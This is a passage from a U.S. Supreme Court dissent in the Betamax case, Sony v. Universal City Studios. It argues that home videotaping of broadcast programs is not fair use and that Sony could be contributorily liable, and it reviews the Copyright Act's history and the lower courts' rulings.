1075 , as amended ( formerly codified as 17 U.S.C. § 1 et seq. ( 1976 ed. ) ) , or the Copyright Revision Act of 1976 ( 1976 Act ) , 90 Stat .
2541 , 17 U.S.C. § 101 et seq. ( 1982 ed. ) .
The District Court also held that even if home VTR recording were an infringement , Sony could not be held liable under theories of direct infringement , contributory infringement , or vicarious liability .
Finally , the court concluded that an injunction against sales of the Betamax would be inappropriate even if Sony were liable under one or more of those theories .
480 F.Supp. 429 ( 1979 ) .
81 The United States Court of Appeals for the Ninth Circuit reversed in virtually every respect .
659 F.2d 963 ( 1981 ) .
It held that the 1909 Act and the 1976 Act contained no implied exemption for " home use " recording , that such recording was not " fair use , " and that the use of the Betamax to record the Studios ' copyrighted works infringed their copyrights .
The Court of Appeals also held Sony liable for contributory infringement , reasoning that Sony knew and anticipated that the Betamax would be used to record copyrighted material off the air , and that Sony , indeed , had induced , caused , or materially contributed to the infringing conduct .
The Court of Appeals remanded the case to the District Court for appropriate relief ; it suggested that the District Court could consider the award of damages or a continuing royalty in lieu of an injunction .
Id. , at 976 .

82 The Copyright Clause of the Constitution , Art. I , § 8 , cl. 8 , empowers Congress " To promote the Progress of Science and useful Arts , by securing for limited Times to Authors and Inventors the exclusive Right to their respective Writings and Discoveries . "
This Nation 's initial copyright statute was passed by the First Congress .
Entitled " An Act for the encouragement of learning , " it gave an author " the sole right and liberty of printing , reprinting , publishing and vending " his " map , chart , book or books " for a period of 14 years .
Act of May 31 , 1790 , § 1 , 1 Stat. 124 .
Since then , as the technology available to authors for creating and preserving their writings has changed , the governing statute has changed with it .
By many amendments , and by complete revisions in 1831 , 1870 , 1909 , and 1976 , authors ' rights have been expanded to provide protection to any " original works of authorship fixed in any tangible medium of expression , " including " motion pictures and other audiovisual works . "
17 U.S.C. § 102(a ) .
83 Section 106 of the 1976 Act grants the owner of a copyright a variety of exclusive rights in the copyrighted work , including the right " to reproduce the copyrighted work in copies or phonorecords . "
This grant expressly is made subject to §§ 107 - 118 , which create a number of exemptions and limitations on the copyright owner 's rights .
The most important of these sections , for present purposes , is § 107 ; that section states that " the fair use of a copyrighted work . . . is not an infringement of copyright . "
84 The 1976 Act , like its predecessors , does not give the copyright owner full and complete control over all possible uses of his work .
If the work is put to some use not enumerated in § 106 , the use is not an infringement .
See Fortnightly Corp. v. United Artists , 392 U.S. 390 , 393-395 , 88 S.Ct. 2084 , 2085-2086 , 20 L.Ed.2d 1176 ( 1968 ) .
Thus , before considering whether home videotaping comes within the scope of the fair use exemption , one first must inquire whether the practice appears to violate the exclusive right , granted in the first instance by § 106 ( 1 ) , " to reproduce the copyrighted work in copies or phonorecords . "
85 Although the word " copies " is in the plural in § 106 ( 1 ) , there can be no question that under the Act the making of even a single unauthorized copy is prohibited .
The Senate and House Reports explain : " The references to ' copies or phonorecords , ' although in the plural , are intended here and throughout the bill to include the singular ( 1 U.S.C. § 1 ) . " S.Rep. No. 94-473 , p. 58 ( 1975 ) ( 1975 Senate Report ) ; H.R. Rep. No. 94-1476 , p. 61 ( 1976 ) ( 1976 House Report ) , U.S.Code Cong. & Admin .
News 1976 , p. 5675 .
The Reports then describe the reproduction right established by § 106( 1 ) :
86 " [ T ] he right ' to reproduce the copyrighted work in copies or phonorecords ' means the right to produce a material object in which the work is duplicated , transcribed , imitated , or simulated in a fixed form from which it can be ' perceived , reproduced , or otherwise communicated , either directly or with the aid of a machine or device . '
As under the present law , a copyrighted work would be infringed by reproducing it in whole or in any substantial part , and by duplicating it exactly or by imitation or simulation . "
1975 Senate Report 58 ; 1976 House Report 61 , U.S.Code Cong. & Admin .
News 1976 , p. 5675 .
87 The making of even a single videotape recording at home falls within this definition ; the VTR user produces a material object from which the copyrighted work later can be perceived .
Unless Congress intended a special exemption for the making of a single copy for personal use , I must conclude that VTR recording is contrary to the exclusive rights granted by § 106 ( 1 ) .
88 The 1976 Act and its accompanying reports specify in some detail the situations in which a single copy of a copyrighted work may be made without infringement concerns .
Section 108 ( a ) , for example , permits a library or archives " to reproduce no more than one copy or phonorecord of a work " for a patron , but only under very limited conditions ; an entire work , moreover , can be copied only if it cannot be obtained elsewhere at a fair price .
§ 108(e ) ; see also § 112 ( a ) ( broadcaster may " make no more than one copy or phonorecord of a particular transmission program , " and only under certain conditions ) .
In other respects , the making of single copies is permissible only within the limited confines of the fair use doctrine .
The Senate report , in a section headed " Single and multiple copying , " notes that the fair use doctrine would permit a teacher to make a single copy of a work for use in the classroom , but only if the work was not a " sizable " one such as a novel or treatise .
1975 Senate Report 63 - 64 ; accord , 1976 House Report 68 - 69 , 71 .
Other situations in which the making of a single copy would be fair use are described in the House and Senate reports .
But neither the statute nor its legislative history suggests any intent to create a general exemption for a single copy made for personal or private use .
89 Indeed , it appears that Congress considered and rejected the very possibility of a special private use exemption .
The issue was raised early in the revision process , in one of the studies prepared for Congress under the supervision of the Copyright Office .
Latman , Fair Use of Copyrighted Works ( 1958 ) , reprinted in Senate Committee on the Judiciary , Copyright Law Revision , Studies Prepared for the Subcommittee on Patents , Trademarks , and Copyrights , 86th Cong. , 2d Sess. , 1 ( 1960 ) ( Latman Fair Use Study ) .
This study found no reported case supporting the existence of an exemption for private use , although it noted that " the purpose and nature of a private use , and in some cases the small amount taken , might lead a court to apply the general principles of fair use in such a way as to deny liability . "
Id. , at 12 .
After reviewing a number of foreign copyright laws that contained explicit statutory exemptions for private or personal use , id. , at 25 , Professor Latman outlined several approaches that a revision bill could take to the general issue of exemptions and fair use .
One of these was the adoption of particularized rules to cover specific situations , including " the field of personal use . "
Id. , at 33 .
90 Rejecting the latter alternative , the Register of Copyrights recommended that the revised copyright statute simply mention the doctrine of fair use and indicate its general scope .
The Register opposed the adoption of rules and exemptions to cover specific situations , preferring , instead , to rely on the judge - made fair use doctrine to resolve new problems as they arose .
See Register 's 1961 Report 25 ; Register 's Supplementary Report 27 - 28 .
91 The Register 's approach was reflected in the first copyright revision bills , drafted by the Copyright Office in 1964 .
These bills , like the 1976 Act , granted the copyright owner the exclusive right to reproduce the copyrighted work , subject only to the exceptions set out in later sections .
H.R. 11947/S. 3008 , 88th Cong. , 2d Sess. , § 5 ( a ) ( 1964 ) .
The primary exception was fair use , § 6 , containing language virtually identical to § 107 of the 1976 Act .
Although the copyright revision bills underwent change in many respects from their first introduction in 1964 to their final passage in 1976 , these portions of the bills did not change .
I can conclude only that Congress , like the Register , intended to rely on the fair use doctrine , and not on a per se exemption for private use , to separate permissible copying from the impermissible .
92 When Congress intended special and protective treatment for private use , moreover , it said so explicitly .
One such explicit statement appears in § 106 itself .
The copyright owner 's exclusive right to perform a copyrighted work , in contrast to his right to reproduce the work in copies , is limited .
Section 106 ( 4 ) grants a copyright owner the exclusive right to perform the work " publicly , " but does not afford the owner protection with respect to private performances by others .
A motion picture is " performed " whenever its images are shown or its sounds are made audible .
§ 101 . Like " sing[ing ] a copyrighted lyric in the shower , " Twentieth Century Music Corp. v. Aiken , 422 U.S. 151 , 155 , 95 S.Ct. 2040 , 2043 , 45 L.Ed.2d 84 ( 1975 ) , watching television at home with one 's family and friends is now considered a performance .
1975 Senate Report 59 - 60 ; 1976 House Report 63 .
Home television viewing nevertheless does not infringe any copyright — but only because § 106 ( 4 ) contains the word " publicly . "
See generally 1975 Senate Report 60 - 61 ; 1976 House Report 63 - 64 ; Register 's 1961 Report 29 - 30 .
No such distinction between public and private uses appears in § 106 ( 1 ) 's prohibition on the making of copies .
93 Similarly , an explicit reference to private use appears in § 108 .
Under that section , a library can make a copy for a patron only for specific types of private use : " private study , scholarship , or research . " §§ 108( d ) ( 1 ) and ( e ) ( 1 ) ; see 37 CFR § 201.14 ( b ) ( 1982 ) .
Limits also are imposed on the extent of the copying and the type of institution that may make copies , and the exemption expressly is made inapplicable to motion pictures and certain other types of works .
§ 108 (h ) .
These limitations would be wholly superfluous if an entire copy of any work could be made by any person for private use .
B
94 The District Court in this case nevertheless concluded that the 1976 Act contained an implied exemption for " home- use recording . "
480 F.Supp. , at 444-446 .
The court relied primarily on the legislative history of a 1971 amendment to the 1909 Act , a reliance that this Court today does not duplicate .
Ante , at 430 , n. 11 .
That amendment , however , was addressed to the specific problem of commercial piracy of sound recordings .
Act of Oct. 15 , 1971 , 85 Stat. 391 ( 1971 Amendment ) .
The House Report on the 1971 Amendment , in a section entitled " Home Recording , " contains the following statement :
95 " In approving the creation of a limited copyright in sound recordings it is the intention of the Committee that this limited copyright not grant any broader rights than are accorded to other copyright proprietors under the existing title 17 .
Specifically , it is not the intention of the Committee to restrain the home recording , from broadcasts or from tapes or records , of recorded performances , where the home recording is for private use and with no purpose of reproducing or otherwise capitalizing commercially on it .
This practice is common and unrestrained today , and the record producers and performers would be in no different position from that of the owners of copyright in recorded musical compositions over the past 20 years . "
H.R. Rep. No. 92-487 , p. 7 ( 1971 ) ( 1971 House Report ) .
96 Similar statements were made during House hearings on the bill and on the House floor , although not in the Senate proceedings .
In concluding that these statements created a general exemption for home recording , the District Court , in my view , paid too little heed to the context in which the statements were made , and failed to consider the limited purpose of the 1971 Amendment and the structure of the 1909 Act .
97 Unlike television broadcasts and other types of motion pictures , sound recordings were not protected by copyright prior to the passage of the 1971 Amendment .
Although the underlying musical work could be copyrighted , the 1909 Act provided no protection for a particular performer 's rendition of the work .
Moreover , copyrighted musical works that had been recorded for public distribution were subject to a " compulsory license " : any person was free to record such a work upon payment of a 2 - cent royalty to the copyright owner .
§ 1(e ) , 35 Stat. 1075 -1076 .
While reproduction without payment of the royalty was an infringement under the 1909 Act , damages were limited to three times the amount of the unpaid royalty .
§ 25(e ) , 35 Stat .
1081 -1082 ; Shapiro , Bernstein & Co. v. Goody , 248 F.2d 260 , 262-263 , 265 ( CA2 1957 ) , cert .
denied , 355 U.S. 952 , 78 S.Ct. 536 , 2 L.Ed.2d 529 ( 1958 ) .
It was observed that the practical effect of these provisions was to legalize record piracy .
See S.Rep. No. 92 -72 , p. 4 ( 1971 ) ; 1971 House Report 2 .
98 In order to suppress this piracy , the 1971 Amendment extended copyright protection beyond the underlying work and to the sound recordings themselves .
Congress chose , however , to provide only limited protection : owners of copyright in sound recordings were given the exclusive right " [ t ] o reproduce [ their works ] and distribute [ them ] to the public . "
1971 Amendment , § 1 ( a ) , 85 Stat. 391 ( formerly codified as 17 U.S.C. § 1 ( f ) ( 1976 ed. ) ) .
This right was merely the right of commercial distribution .
See 117 Cong.Rec. 34748-34749 ( 1971 ) ( colloquy of Reps. Kazen & Kastenmeier ) ( " the bill protects copyrighted material that is duplicated for commercial purposes only " ) .
99 Against this background , the statements regarding home recording under the 1971 Amendment appear in a very different light .
If home recording was " common and unrestrained " under the 1909 Act , see 1971 House Report 7 , it was because sound recordings had no copyright protection and the owner of a copyright in the underlying musical work could collect no more than a 2 - cent royalty plus 6 cents in damages for each unauthorized use .
With so little at stake , it is not at all surprising that the Assistant Register " d[id ] not see anybody going into anyone 's home and preventing this sort of thing . "
1971 House Hearings 23 .
100
But the references to home sound recording in the 1971 Amendment 's legislative history demonstrate no congressional intent to create a generalized home use exemption from copyright protection .
Congress , having recognized that the 1909 Act had been unsuccessful in controlling home sound recording , addressed only the specific problem of commercial record piracy .
To quote Assistant Register Ringer again , home use was " not what this legislation [ was ] addressed to . "
1971 House Hearings 22 .
101 While the 1971 Amendment narrowed the sound recordings loophole in then existing copyright law , motion pictures and other audiovisual works have been accorded full copyright protection since at least 1912 , see Act of Aug. 24 , 1912 , 37 Stat. 488 , and perhaps before , see Edison v. Lubin , 122 F. 240 ( CA3 1903 ) , app. dism'd , 195 U.S. 625 , 25 S.Ct. 790 , 49 L.Ed. 349 ( 1904 ) .
Congress continued this protection in the 1976 Act .
Unlike the sound recording rights created by the 1971 Amendment , the reproduction rights associated with motion pictures under § 106 ( 1 ) are not limited to reproduction for public distribution ; the copyright owner 's right to reproduce the work exists independently , and the " mere duplication of a copy may constitute an infringement even if it is never distributed . "
Register 's Supplementary Report 16 ; see 1975 Senate Report 57 and 1976 House Report 61 .
Moreover , the 1976 Act was intended as a comprehensive treatment of all aspects of copyright law .
The reports accompanying the 1976 Act , unlike the 1971 House Report , contain no suggestion that home - use recording is somehow outside the scope of this all - inclusive statute .
It was clearly the intent of Congress that no additional exemptions were to be implied .
102 I therefore find in the 1976 Act no implied exemption to cover the home taping of television programs , whether it be for a single copy , for private use , or for home use .
Taping a copyrighted television program is infringement unless it is permitted by the fair use exemption contained in § 107 of the 1976 Act .
I now turn to that issue .
IV
Fair Use
104 Nor did Congress provide definitive rules when it codified the fair use doctrine in the 1976 Act ; it simply incorporated a list of factors " to be considered " : the " purpose and character of the use , " the " nature of the copyrighted work , " the " amount and substantiality of the portion used , " and , perhaps the most important , the " effect of the use upon the potential market for or value of the copyrighted work " ( emphasis supplied ) .
§ 107 .
No particular weight , however , was assigned to any of these , and the list was not intended to be exclusive .
The House and Senate Reports explain that § 107 does no more than give " statutory recognition " to the fair use doctrine ; it was intended " to restate the present judicial doctrine of fair use , not to change , narrow , or enlarge it in any way . "
1976 House Report 66 , U.S.Code Cong. & Admin .
News 1976 , p. 5680 .
See 1975 Senate Report 62 ; S.Rep. No. 93-983 , p. 116 ( 1974 ) ; H.R. Rep. No. 83 , 90th Cong. , 1st Sess. , 32 ( 1967 ) ; H.R. Rep. No. 2237 , 89th Cong. , 2d Sess. , 61 ( 1966 ) .
105 * Despite this absence of clear standards , the fair use doctrine plays a crucial role in the law of copyright .
The purpose of copyright protection , in the words of the Constitution , is to " promote the Progress of Science and useful Arts . "
Copyright is based on the belief that by granting authors the exclusive rights to reproduce their works , they are given an incentive to create , and that " encouragement of individual effort by personal gain is the best way to advance public welfare through the talents of authors and inventors in ' Science and the useful Arts . ' " Mazer v. Stein , 347 U.S. 201 , 219 , 74 S.Ct. 460 , 471 , 98 L.Ed. 630 ( 1954 ) .
The monopoly created by copyright thus rewards the individual author in order to benefit the public .
Twentieth Century Music Corp. v. Aiken , 422 U.S. 151 , 156 , 95 S.Ct. 2040 , 2043 , 45 L.Ed.2d 84 ( 1975 ) ; Fox Film Corp. v. Doyal , 286 U.S. 123 , 127-128 , 52 S.Ct. 546 , 547 , 76 L.Ed. 1010 ( 1932 ) ; see H.R. Rep. No. 2222 , 60th Cong. , 2d Sess. , 7 ( 1909 ) .
106 There are situations , nevertheless , in which strict enforcement of this monopoly would inhibit the very " Progress of Science and useful Arts " that copyright is intended to promote .
An obvious example is the researcher or scholar whose own work depends on the ability to refer to and to quote the work of prior scholars .
Obviously , no author could create a new work if he were first required to repeat the research of every author who had gone before him .
The scholar , like the ordinary user , of course could be left to bargain with each copyright owner for permission to quote from or refer to prior works .
But there is a crucial difference between the scholar and the ordinary user .
When the ordinary user decides that the owner 's price is too high , and forgoes use of the work , only the individual is the loser .
When the scholar forgoes the use of a prior work , not only does his own work suffer , but the public is deprived of his contribution to knowledge .
The scholar 's work , in other words , produces external benefits from which everyone profits .
In such a case , the fair use doctrine acts as a form of subsidy — albeit at the first author 's expense — to permit the second author to make limited use of the first author 's work for the public good .
See Latman Fair Use Study 31 ; Gordon , Fair Use as Market Failure : A Structural Analysis of the Betamax Case and its Predecessors , 82 Colum .L.Rev. 1600 , 1630 ( 1982 ) .
107 A similar subsidy may be appropriate in a range of areas other than pure scholarship .
The situations in which fair use is most commonly recognized are listed in § 107 itself ; fair use may be found when a work is used " for purposes such as criticism , comment , news reporting , teaching , . . . scholarship , or research . "
The House and Senate Reports expand on this list somewhat , and other examples may be found in the case law .
Each of these uses , however , reflects a common theme : each is a productive use , resulting in some added benefit to the public beyond that produced by the first author 's work .
The fair use doctrine , in other words , permits works to be used for " socially laudable purposes . "
See Copyright Office , Briefing Papers on Current Issues , reprinted in 1975 House Hearings 2051 , 2055 .
I am aware of no case in which the reproduction of a copyrighted work for the sole benefit of the user has been held to be fair use .
108 I do not suggest , of course , that every productive use is a fair use .
A finding of fair use still must depend on the facts of the individual case , and on whether , under the circumstances , it is reasonable to expect the user to bargain with the copyright owner for use of the work .
The fair use doctrine must strike a balance between the dual risks created by the copyright system : on the one hand , that depriving authors of their monopoly will reduce their incentive to create , and , on the other , that granting authors a complete monopoly will reduce the creative ability of others .
The inquiry is necessarily a flexible one , and the endless variety of situations that may arise precludes the formulation of exact rules .
But when a user reproduces an entire work and uses it for its original purpose , with no added benefit to the public , the doctrine of fair use usually does not apply .
There is then no need whatsoever to provide the ordinary user with a fair use subsidy at the author 's expense .
109
The making of a videotape recording for home viewing is an ordinary rather than a productive use of the Studios ' copyrighted works .
The District Court found that " Betamax owners use the copy for the same purpose as the original .
They add nothing of their own . "
480 F.Supp. , at 453 .
Although applying the fair use doctrine to home VTR recording , as Sony argues , may increase public access to material broadcast free over the public airwaves , I think Sony 's argument misconceives the nature of copyright .
Copyright gives the author a right to limit or even to cut off access to his work .
Fox Film Corp. v. Doyal , 286 U.S. 123 , 127 , 52 S.Ct. 546 , 547 , 76 L.Ed. 1010 ( 1932 ) .
A VTR recording creates no public benefit sufficient to justify limiting this right .
Nor is this right extinguished by the copyright owner 's choice to make the work available over the airwaves .
Section 106 of the 1976
Act grants the copyright owner the exclusive right to control the performance and the reproduction of his work , and the fact that he has licensed a single television performance is really irrelevant to the existence of his right to control its reproduction .
Although a television broadcast may be free to the viewer , this fact is equally irrelevant ; a book borrowed from the public library may not be copied any more freely than a book that is purchased .
110 It may be tempting , as , in my view , the Court today is tempted , to stretch the doctrine of fair use so as to permit unfettered use of this new technology in order to increase access to television programming .
But such an extension risks eroding the very basis of copyright law , by depriving authors of control over their works and consequently of their incentive to create .
Even in the context of highly productive educational uses , Congress has avoided this temptation ; in passing the 1976 Act , Congress made it clear that off - the - air videotaping was to be permitted only in very limited situations .
See 1976 House Report 71 ; 1975 Senate Report 64 .
And , the Senate report adds , " [t ] he committee does not intend to suggest . . . that off - the - air recording for convenience would under any circumstances , be considered ' fair use . ' " Id. , at 66 .
I cannot disregard these admonitions .
B
111 I recognize , nevertheless , that there are situations where permitting even an unproductive use would have no effect on the author 's incentive to create , that is , where the use would not affect the value of , or the market for , the author 's work .
Photocopying an old newspaper clipping to send to a friend may be an example ; pinning a quotation on one 's bulletin board may be another .
In each of these cases , the effect on the author is truly de minimis .
Thus , even though these uses provide no benefit to the public at large , no purpose is served by preserving the author 's monopoly , and the use may be regarded as fair .
112 Courts should move with caution , however , in depriving authors of protection from unproductive " ordinary " uses .
As has been noted above , even in the case of a productive use , § 107 ( 4 ) requires consideration of " the effect of the use upon the potential market for or value of the copyrighted work " ( emphasis added ) . " [ A ] particular use which may seem to have little or no economic impact on the author 's rights today can assume tremendous importance in times to come . "
Register 's Supplementary Report 14 .
Although such a use may seem harmless when viewed in isolation , " [ i ] solated instances of minor infringements , when multiplied many times , become in the aggregate a major inroad on copyright that must be prevented . "
1975 Senate Report 65 .
113 I therefore conclude that , at least when the proposed use is an unproductive one , a copyright owner need prove only a potential for harm to the market for or the value of the copyrighted work .
See 3 M. Nimmer , Copyright § 13.05 [ E ] [ 4 ] [c ] , p. 13 -84 ( 1982 ) .
Proof of actual harm , or even probable harm , may be impossible in an area where the effect of a new technology is speculative , and requiring such proof would present the " real danger . . . of confining the scope of an author 's rights on the basis of the present technology so that , as the years go by , his copyright loses much of its value because of unforeseen technical advances . "
Register 's Supplementary Report 14 .
Infringement thus would be found if the copyright owner demonstrates a reasonable possibility that harm will result from the proposed use .
When the use is one that creates no benefit to the public at large , copyright protection should not be denied on the basis that a new technology that may result in harm has not yet done so .
114 The Studios have identified a number of ways in which VTR recording could damage their copyrights .
VTR recording could reduce their ability to market their works in movie theaters and through the rental or sale of pre-recorded videotapes or videodiscs ; it also could reduce their rerun audience , and consequently the license fees available to them for repeated showings .
Moreover , advertisers may be willing to pay for only " live " viewing audiences , if they believe VTR viewers will delete commercials or if rating services are unable to measure VTR use ; if this is the case , VTR recording could reduce the license fees the Studios are able to charge even for first - run showings .
Library - building may raise the potential for each of the types of harm identified by the Studios , and time - shifting may raise the potential for substantial harm as well .
115 Although the District Court found no likelihood of harm from VTR use , 480 F.Supp. , at 468 , I conclude that it applied an incorrect substantive standard and misallocated the burden of proof .
The District Court reasoned that the Studios had failed to prove that library - building would occur " to any significant extent , " id. , at 467 ; that the Studios ' prerecorded videodiscs could compete with VTR recordings and were " arguably . . . more desirable , " ibid ; that it was " not clear that movie audiences will decrease , " id. , at 468 ; and that the practice of deleting commercials " may be too tedious " for many viewers , ibid .
To the extent any decrease in advertising revenues would occur , the court concluded that the Studios had " marketing alternatives at hand to recoup some of that predicted loss . "
Id. , at 452 .
Because the Studios ' prediction of harm was " based on so many assumptions and on a system of marketing which is rapidly changing , " the court was " hesitant to identify ' probable effects ' of home - use copying . "
Ibid .
116 The District Court 's reluctance to engage in prediction in this area is understandable , but , in my view , the court was mistaken in concluding that the Studios should bear the risk created by this uncertainty .
The Studios have demonstrated a potential for harm , which has not been , and could not be , refuted at this early stage of technological development .
117 The District Court 's analysis of harm , moreover , failed to consider the effect of VTR recording on " the potential market for or the value of the copyrighted work , " as required by § 107 ( 4 ) .
The requirement that a putatively infringing use of a copyrighted work , to be " fair , " must not impair a " potential " market for the work has two implications .
First , an infringer cannot prevail merely by demonstrating that the copyright holder suffered no net harm from the infringer 's action .
Indeed , even a showing that the infringement has resulted in a net benefit to the copyright holder will not suffice .
Rather , the infringer must demonstrate that he had not impaired the copyright holder 's ability to demand compensation from ( or to deny access to ) any group who would otherwise be willing to pay to see or hear the copyrighted work .
Second , the fact that a given market for a copyrighted work would not be available to the copyright holder were it not for the infringer 's activities does not permit the infringer to exploit that market without compensating the copyright holder .
See Iowa State University Research Foundation , Inc. v. American Broadcasting Cos. , 621 F.2d 57 ( CA2 1980 ) .
118 In this case , the Studios and their amici demonstrate that the advent of the VTR technology created a potential market for their copyrighted programs .
That market consists of those persons who find it impossible or inconvenient to watch the programs at the time they are broadcast , and who wish to watch them at other times .
These persons are willing to pay for the privilege of watching copyrighted work at their convenience , as is evidenced by the fact that they are willing to pay for VTRs and tapes ; undoubtedly , most also would be willing to pay some kind of royalty to copyright holders .
The Studios correctly argue that they have been deprived of the ability to exploit this sizable market .
119 It is thus apparent from the record and from the findings of the District Court that time - shifting does have a substantial adverse effect upon the " potential market for " the Studios ' copyrighted works .
Accordingly , even under the formulation of the fair use doctrine advanced by Sony , time - shifting cannot be deemed a fair use .
V
Contributory Infringement
120 From the Studios ' perspective , the consequences of home VTR recording are the same as if a business had taped the Studios ' works off the air , duplicated the tapes , and sold or rented them to members of the public for home viewing .
The distinction is that home VTR users do not record for commercial advantage ; the commercial benefit accrues to the manufacturer and distributors of the Betamax .
I thus must proceed to discuss whether the manufacturer and distributors can be held contributorily liable if the product they sell is used to infringe .
121 It is well established that liability for copyright infringement can be imposed on persons other than those who actually carry out the infringing activity .
Kalem Co. v. Harper Brothers , 222 U.S. 55 , 62-63 , 32 S.Ct. 20 , 21-22 , 56 L.Ed. 92 ( 1911 ) ; 3 M. Nimmer , Copyright § 12.04 [ A ] ( 1982 ) ; see Twentieth Century Music Corp. v. Aiken , 422 U.S. 151 , 160 , n. 11 , 95 S.Ct. 2040 , 2046 , n. 11 , 45 L.Ed.2d 84 ( 1975 ) ; Buck v. Jewell - LaSalle Realty Co. , 283 U.S. 191 , 198 , 51 S.Ct. 410 , 411 , 75 L.Ed. 971 ( 1931 ) .
Although the liability provision of the 1976
Act provides simply that " [ a ] nyone who violates any of the exclusive rights of the copyright owner .
. . is an infringer of the copyright , " 17 U.S.C. § 501 ( a ) , the House and Senate Reports demonstrate that Congress intended to retain judicial doctrines of contributory infringement .
1975 Senate Report 57 ; 1976 House Report 61 .
122 The doctrine of contributory copyright infringement , however , is not well - defined .
One of the few attempts at definition appears in Gershwin Publishing Corp. v. Columbia Artists Management , Inc. , 443 F.2d 1159 ( CA2 1971 ) .
In that case the Second Circuit stated that " one who , with knowledge of the infringing activity , induces , causes or materially contributes to the infringing conduct of another , may be held liable as a ' contributory ' infringer . "
Id. , at 1162 ( footnote omitted ) .
While I have no quarrel with this general statement , it does not easily resolve the present case ; the District Court and the Court of Appeals , both purporting to apply it , reached diametrically opposite results .
A .
123 In absolving Sony from liability , the District Court reasoned that Sony had no direct involvement with individual Betamax users , did not participate in any off - the - air copying , and did not know that such copying was an infringement of the Studios ' copyright .
480 F.Supp. , at 460 .
I agree with the Gershwin court that contributory liability may be imposed even when the defendant has no formal control over the infringer .
The defendant in Gershwin was a concert promoter operating through local concert associations that it sponsored ; it had no formal control over the infringing performers themselves .
443 F.2d , at 1162 - 1163 .
See also Twentieth Century Music Corp. v. Aiken , 422 U.S. , at 160 , n. 11 , 95 S.Ct. , at 2046 , n. 11 .
Moreover , a finding of contributory infringement has never depended on actual knowledge of particular instances of infringement ; it is sufficient that the defendant have reason to know that infringement is taking place .
443 F.2d , at 1162 ; see Screen Gems- Columbia Music , Inc. v. Mark - Fi Records , Inc. , 256 F.Supp. 399 ( SDNY 1966 ) .
In the so - called " dance hall " cases , in which questions of contributory infringement arise with some frequency , proprietors of entertainment establishments routinely are held liable for unauthorized performances on their premises , even when they have no knowledge that copyrighted works are being performed .
In effect , the proprietors in those cases are charged with constructive knowledge of the performances .
124 Nor is it necessary that the defendant be aware that the infringing activity violates the copyright laws .
Section 504 ( c ) ( 2 ) of the 1976
Act provides for a reduction in statutory damages when an infringer proves he " was not aware and had no reason to believe that his or her acts constituted an infringement of copyright , " but the statute establishes no general exemption for those who believe their infringing activities are legal .
Moreover , such an exemption would be meaningless in a case such as this , in which prospective relief is sought ; once a court has established that the copying at issue is infringement , the defendants are necessarily aware of that fact for the future .
It is undisputed in this case that Sony had reason to know the Betamax would be used by some owners to tape copyrighted works off the air .
See 480 F.Supp. , at 459-460 .
125 The District Court also concluded that Sony had not caused , induced , or contributed materially to any infringing activities of Betamax owners .
480 F.Supp. , at 460 .
In a case of this kind , however , causation can be shown indirectly ; it does not depend on evidence that particular Betamax owners relied on particular advertisements .
In an analogous case decided just two Terms ago , this Court approved a lower court 's conclusion that liability for contributory trademark infringement could be imposed on a manufacturer who " suggested , even by implication " that a retailer use the manufacturer 's goods to infringe the trademark of another .
Inwood Laboratories , Inc. v. Ives Laboratories , Inc. , 456 U.S. 844 , 851 , 102 S.Ct. 2182 , 2186 , 72 L.Ed.2d 606 ( 1982 ) ; see id. , at 860 , 102 S.Ct. , at 2191 ( concurring opinion ) .
I think this standard is equally appropriate in the copyright context .
126 The District Court found that Sony has advertised the Betamax as suitable for off - the - air recording of " favorite shows , " " novels for television , " and " classic movies , " 480 F.Supp. , at 436 , with no visible warning that such recording could constitute copyright infringement .
It is only with the aid of the Betamax or some other VTR , that it is possible today for home television viewers to infringe copyright by recording off - the - air .
Off - the - air recording is not only a foreseeable use for the Betamax , but indeed is its intended use .
Under the circumstances , I agree with the Court of Appeals that if off - the - air recording is an infringement of copyright , Sony has induced and materially contributed to the infringing conduct of Betamax owners .
B
127 Sony argues that the manufacturer or seller of a product used to infringe is absolved from liability whenever the product can be put to any substantial noninfringing use .
Brief for Petitioners 41 - 42 .
The District Court so held , borrowing the " staple article of commerce " doctrine governing liability for contributory infringement of patents .
See 35 U.S.C. § 271 .
This Court today is much less positive .
See ante , at 440 - 442 .
I do not agree that this technical judge - made doctrine of patent law , based in part on considerations irrelevant to the field of copyright , see generally Dawson Chemical Co. v. Rohm & Haas Co. , 448 U.S. 176 , 187-199 , 100 S.Ct.
2601 , 2608-2614 , 65 L.Ed.2d 696 ( 1980 ) , should be imported wholesale into copyright law .
Despite their common constitutional source , see U.S. Const. , Art. I , § 8 , cl. 8 , patent and copyright protections have not developed in a parallel fashion , and this Court in copyright cases in the past has borrowed patent concepts only sparingly .
See Bobbs - Merrill Co. v. Straus , 210 U.S. 339 , 345-346 , 28 S.Ct. 722 , 724 , 52 L.Ed. 1086 ( 1908 ) .
128 I recognize , however , that many of the concerns underlying the " staple article of commerce " doctrine are present in copyright law as well .
As the District Court noted , if liability for contributory infringement were imposed on the manufacturer or seller of every product used to infringe — a typewriter , a camera , a photocopying machine — the " wheels of commerce " would be blocked .
480 F.Supp. , at 461 ; see also Kalem Co. v. Harper Brothers , 222 U.S. , at 62 , 32 S.Ct. , at 21 .
129 I therefore conclude that if a significant portion of the product 's use is noninfringing , the manufacturers and sellers cannot be held contributorily liable for the product 's infringing uses .
See ante , at 440 - 441 .
If virtually all of the product 's use , however , is to infringe , contributory liability may be imposed ; if no one would buy the product for noninfringing purposes alone , it is clear that the manufacturer is purposely profiting from the infringement , and that liability is appropriately imposed .
In such a case , the copyright owner 's monopoly would not be extended beyond its proper bounds ; the manufacturer of such a product contributes to the infringing activities of others and profits directly thereby , while providing no benefit to the public sufficient to justify the infringement .
130 The Court of Appeals concluded that Sony should be held liable for contributory infringement , reasoning that " [ v ] ideotape recorders are manufactured , advertised , and sold for the primary purpose of reproducing television programming , " and " [ v] irtually all television programming is copyrighted material . "
659 F.2d , at 975 .
While I agree with the first of these propositions , the second , for me , is problematic .
The key question is not the amount of television programming that is copyrighted , but rather the amount of VTR usage that is infringing .
Moreover , the parties and their amici have argued vigorously about both the amount of television programming that is covered by copyright and the amount for which permission to copy has been given .
The proportion of VTR recording that is infringing is ultimately a question of fact , and the District Court specifically declined to make findings on the " percentage of legal versus illegal home - use recording . "
480 F.Supp. , at 468 .
In light of my view of the law , resolution of this factual question is essential .
I therefore would remand the case for further consideration of this by the District Court .
VI
131 The Court has adopted an approach very different from the one I have outlined .
It is my view that the Court 's approach alters dramatically the doctrines of fair use and contributory infringement as they have been developed by Congress and the courts .
Should Congress choose to respond to the Court 's decision , the old doctrines can be resurrected .
As it stands , however , the decision today erodes much of the coherence that these doctrines have struggled to achieve .
132 The Court 's disposition of the case turns on its conclusion that time - shifting is a fair use .
